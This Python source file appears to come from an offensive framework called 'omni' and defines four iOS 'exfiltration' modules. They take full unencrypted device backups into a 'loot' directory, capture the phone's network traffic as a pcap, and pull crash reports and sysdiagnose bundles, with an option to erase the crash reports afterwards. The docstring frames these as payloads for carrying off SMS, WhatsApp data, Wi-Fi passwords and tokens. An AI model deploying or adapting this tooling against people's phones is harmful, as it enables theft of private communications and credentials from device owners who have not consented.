"""iOS exfiltration: full backups, traffic capture, crash bundles.

These are the payloads that leave with data:

* ``ios.backup`` — an unencrypted device backup is the whole app-data set:
  SMS, WhatsApp, keychain-adjacent plists, Wi-Fi passwords. Run it, then point
  any backup reader at the folder.
* ``ios.sniff`` — ``pymobiledevice3 pcap`` routes the phone's own traffic
  through the host as a real pcap (needs Developer Mode).
* ``ios.crash`` — crash reports and ``sysdiagnose`` carry tokens, endpoint
  IDs, and the full hardware/network state.
"""

from __future__ import annotations

import os
import time

from omni.core import config, console
from omni.core.module import Option
from omni.ios.modules._base import IosModule

__all__ = ["Backup", "Sniff", "Crash", "Sysdiagnose"]


class Backup(IosModule):
    NAME = "ios.backup"
    DESCRIPTION = "Take a full device backup into the loot directory"
    NEEDS = ("pymobiledevice3",)
    OPTIONS = (Option("UDID", "target UDID"),
               Option("OUT", "backup directory"),
               Option("FULL", "force a full backup, not incremental", "true",
                      choices=("true", "false")),
               Option("PASSWORD", "set to encrypt the backup"))

    def execute(self) -> dict:
        client = self.client()
        target = os.path.expanduser(
            self.get("OUT") or
            os.path.join(config.output_dir("ios/backups"),
                         f"backup_{time.strftime('%Y%m%d_%H%M%S')}"))
        args = ["backup2", "backup", target]
        if self.get_bool("FULL", True):
            args += ["--full"]
        if self.get("PASSWORD"):
            args += ["--password", self.get("PASSWORD")]
        console.warn("unlock the phone and confirm 'Trust this computer' if asked")
        client.check(*args, timeout=3600)
        top = os.listdir(target) if os.path.isdir(target) else []
        size = sum(os.path.getsize(os.path.join(target, name))
                   for name in top
                   if os.path.isfile(os.path.join(target, name)))
        console.ok(f"backup at {target} ({size} byte(s) at top level)")
        return {"target": target, "bytes": size}


class Sniff(IosModule):
    NAME = "ios.sniff"
    DESCRIPTION = "Capture the phone's own network traffic as a pcap"
    NEEDS = ("pymobiledevice3",)
    OPTIONS = (Option("UDID", "target UDID"),
               Option("OUT", "pcap path"),
               Option("COUNT", "packets to capture", "500"),
               Option("PROCESS", "only this process"))

    def execute(self) -> dict:
        client = self.client()
        out = os.path.expanduser(
            self.get("OUT") or
            os.path.join(config.output_dir("ios/pcap"),
                         f"traffic_{time.strftime('%Y%m%d_%H%M%S')}.pcap"))
        os.makedirs(os.path.dirname(out), exist_ok=True)
        args = ["pcap", "--count", str(max(1, self.get_int("COUNT", 500)))]
        if self.get("PROCESS"):
            args += ["--process", self.get("PROCESS")]
        args.append(out)
        client.check(*args, timeout=900)
        size = os.path.getsize(out) if os.path.isfile(out) else 0
        console.ok(f"{size} byte pcap -> {out}")
        return {"pcap": out, "bytes": size}


class Crash(IosModule):
    NAME = "ios.crash"
    DESCRIPTION = "Pull crash reports (tokens, endpoint IDs, process state)"
    NEEDS = ("pymobiledevice3",)
    OPTIONS = (Option("UDID", "target UDID"),
               Option("OUT", "destination directory"),
               Option("ERASE", "delete after pulling", "false",
                      choices=("true", "false")))

    def execute(self) -> dict:
        client = self.client()
        out = os.path.expanduser(self.get("OUT") or
                                 config.output_dir("ios/crash"))
        os.makedirs(out, exist_ok=True)
        args = ["crash", "pull", out]
        if self.get_bool("ERASE"):
            args += ["--erase"]
        client.check(*args, timeout=1800)
        count = sum(len(files) for _root, _dirs, files in os.walk(out))
        console.ok(f"{count} file(s) -> {out}")
        return {"out": out, "files": count}


class Sysdiagnose(IosModule):
    NAME = "ios.sysdiagnose"
    DESCRIPTION = "Trigger and pull the full sysdiagnose bundle"
    NEEDS = ("pymobiledevice3",)
    OPTIONS = (Option("UDID", "target UDID"),
               Option("OUT", "destination directory"))

    def execute(self) -> dict:
        client = self.client()
        out = os.path.expanduser(self.get("OUT") or
                                 config.output_dir("ios/sysdiagnose"))
        os.makedirs(out, exist_ok=True)
        console.info("triggering sysdiagnose — takes a few minutes")
        client.check("crash", "sysdiagnose", out, timeout=3600)
        return {"out": out}
